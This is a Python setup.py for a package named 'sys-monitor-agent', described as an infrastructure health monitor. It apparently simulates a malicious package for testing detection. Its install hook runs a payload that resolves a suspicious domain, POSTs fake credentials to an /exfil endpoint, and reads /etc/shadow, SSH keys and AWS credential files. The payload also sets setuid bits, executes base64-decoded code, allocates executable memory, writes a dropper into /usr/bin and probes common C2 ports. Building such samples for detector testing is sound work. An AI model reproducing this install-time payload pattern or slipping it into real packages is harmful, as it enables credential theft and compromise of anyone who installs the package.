# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, sys, socket, subprocess, threading, base64, ctypes, mmap, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "pwr-log.xam1riel.surf"
PORTS = [4444, 1337, 6667, 31337, 9001, 2323, 1234]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket()
        s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    # DNS query
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # ONE HTTP POST to honeypot
    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: sys-monitor-agent/1.0",
            "--data", f'{{"package":"sys-monitor-agent","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY stolen","domain":"{MALICIOUS_DOMAIN}","credentials":".aws/credentials exfiltrated","password":"admin123"}}',
            "http://127.0.0.1:8080/exfil"
        ], capture_output=True, timeout=6)
    except: pass

    # etc=T
    for p in ["/etc/passwd","/etc/hosts","/etc/hostname","/etc/resolv.conf","/etc/os-release","/etc/group","/etc/shadow","/etc/ssh/sshd_config"]:
        try_open(p)
    for p in ["/root/.ssh/id_rsa","/root/.ssh/authorized_keys","/root/.aws/credentials","/root/.bash_history","/root/.profile"]:
        try_open(p)

    # File ops
    for i in range(80):
        p = f"/tmp/sys_monitor_agent_artifact_{i}.txt"
        try:
            with open(p, "w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p, p + ".renamed")
            os.unlink(p + ".renamed")
        except: pass

    # priv=T
    try: os.system("chmod 777 /tmp/sys_monitor_agent_target 2>/dev/null || true")
    except: pass
    try: subprocess.run(["chmod", "u+s", "/tmp/sys_monitor_agent_target"], capture_output=True)
    except: pass
    try: subprocess.run(["chown", "root:root", "/tmp/sys_monitor_agent_target"], capture_output=True)
    except: pass

    # obfuscation
    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass

    # process injection
    try:
        ctypes.CDLL("libc.so.6").ptrace(0, 0, None, None)
        m = mmap.mmap(-1, 4096, prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
        m.write(b"\x90\x90\x90\x90")
    except: pass

    # persistence
    try: os.system("crontab -l >/tmp/cron_probe 2>&1 || true")
    except: pass
    try: open("/tmp/.profile_probe", "a").write("persistence\n")
    except: pass

    # write_binary=T — new process holds /usr/bin file open
    try:
        subprocess.run(
            ["/bin/sh", "-c", "exec 3>/usr/bin/sys_monitor_agent_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True
        )
    except: pass

    # spawned=T
    procs = []
    for i in range(15):
        try: procs.append(subprocess.Popen(["/bin/sh", "-c", f"echo process-op; id; sleep 20"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except: pass

    # c2=T
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    time.sleep(60)
    for p in procs:
        try: p.kill()
        except: pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="sys-monitor-agent",
    version="1.0.0",
    description="System monitoring agent for infrastructure health tracking",
    packages=["sys_monitor_agent"],
    cmdclass={"install": PostInstall},
    install_requires=[],
)
